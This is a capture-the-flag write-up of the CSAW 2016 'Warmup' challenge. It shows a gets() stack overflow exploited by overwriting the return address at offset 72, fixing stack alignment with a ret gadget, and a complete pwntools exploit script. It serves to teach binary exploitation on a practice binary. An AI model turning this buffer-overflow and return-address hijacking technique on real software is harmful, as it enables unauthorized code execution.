
# Warmup

The `main()` function puts the input buffer into the vulnerable `gets()` function as an argument.

```c
void main(void)

{
  char local_88 [64];
  char buffer [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(buffer);
  return;
```

There is an `easy` function at `0x40060d` that prints out `flag.txt`.

```shell
void easy(void)

{
  system("cat flag.txt");
  return;
}
```

Generate a cyclic pattern in `gdb`

```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

pwndbg> r a
Starting program: /home/wither/NOTES/CSAW/2016/Warmup/warmup a
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Warm Up-
WOW:0x40060d
>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Find the offset of the pattern that clobbered the return address at **72** bytes.

```
0x4006a4 <main+135>    ret                                <0x616161616161616a>

cyclic -l "0x616161616161616a"

Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

The expected payload didn't work

```
run < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 + p64(0x40060d))')

Starting program: /home/wither/NOTES/CSAW/2016/Warmup/warmup < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 +  p64(0x40060d))')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Warm Up-
WOW:0x40060d
>
Program received signal SIGSEGV, Segmentation fault.
```

Taking a closer look at the `easy` function.

```
disass easy

Dump of assembler code for function easy:
   0x000000000040060d <+0>:     push   rbp
   0x000000000040060e <+1>:     mov    rbp,rsp
   0x0000000000400611 <+4>:     mov    edi,0x400734
   0x0000000000400616 <+9>:     call   0x4004d0 <system@plt>
   0x000000000040061b <+14>:    pop    rbp
   0x000000000040061c <+15>:    ret
End of assembler dump.
```

Create a breakpoint at the `system` function, right before `cat flag.txt` and run the payload.

```
b *0x400616
Breakpoint 1 at 0x400616

pwndbg> run < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 + p64(0x40060d))')
```

The program will crash right here, at the `moveaps` instruction, which gdb tells us is **not aligned to 16 bytes**. 

```
 ► 0x7ffff7c5843b <do_system+363>    movaps xmmword ptr [rsp + 0x50], xmm0     <[0x7fffffffd978] not aligned to 16 bytes>
```

This can be confirmed by printing in hex if the current $rsp % 16. If it was **16-byte aligned**, $rsp % 16 would be 0. Instead, the current $rsp is **8 bytes** misaligned.

```
p/x (unsigned long)$rsp % 16

$1 = 0x8
```

To fix this, find a `ret` gadget using `ropper`.

```shell
 ropper --file warmup --search "ret"
 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: warmup
0x0000000000400595: ret 0xc148;
0x00000000004004a1: ret;
```

Add the address of the gadget in front of the payload to **pop** the misaligned bytes, ensuring our payload is **16-byte aligned**, thus executes without crashing and gives us the flag.

```
run < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 + p64(0x4004a1) + p64(0x40060d))')

Starting program: /home/wither/NOTES/CSAW/2016/Warmup/warmup < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 + p64(0x4004a1) + p64(0x40060d))')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Warm Up-
WOW:0x40060d
>[Attaching after Thread 0x7ffff7fa8740 (LWP 44634) vfork to child process 44640]
[New inferior 2 (process 44640)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 44634 after child exec]
[Inferior 1 (process 44634) detached]
process 44640 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7fa8740 (LWP 44640) vfork to child process 44641]
[New inferior 3 (process 44641)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 44640 after child exec]
[Inferior 2 (process 44640) detached]
process 44641 is executing new program: /usr/bin/cat
warning: could not find '.gnu_debugaltlink' file for /usr/bin/cat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

flag{g0ttem_b0yz}
```

This can easily be automated with Python and pwntools

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./warmup", checksec=False)
p = process()

payload = b"A"*72 + p64(0x4004a1) + p64(0x40060d)

p.sendline(payload)
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
```

To get the flag.

```shell
python3 exploit.py
 
-Warm Up-

WOW:0x40060d

>flag{g0ttem_b0yz}
```